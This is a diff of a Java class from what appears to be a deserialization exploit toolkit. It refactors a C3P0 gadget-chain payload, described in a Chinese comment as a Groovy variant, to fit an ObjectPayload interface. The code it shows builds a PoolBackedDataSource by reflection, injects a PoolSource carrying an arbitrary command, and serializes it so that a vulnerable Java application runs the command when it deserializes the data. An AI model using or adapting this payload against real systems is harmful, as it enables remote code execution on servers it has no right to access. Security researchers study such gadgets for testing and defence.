@@ -22,10 +22,10 @@ import java.util.logging.Logger;
 /**
  * 同 C3P0 2 只不过使用了 Groovy
  */
-public class C3P03 {
+public class C3P03 implements ObjectPayload<Object> {
 
-    public static byte[] getBytes(PayloadType type) throws Exception {
-        String               command = String.valueOf(type);
+    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+        String               command = param[0];
         PoolBackedDataSource b       = Reflections.createWithoutConstructor(PoolBackedDataSource.class);
         Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource(command));
 
@@ -36,6 +36,11 @@ public class C3P03 {
         oos.close();
 
         return bytes;
+    }
+
+    @Override
+    public Object getObject(String command) throws Exception {
+        return null;
     }
 
 
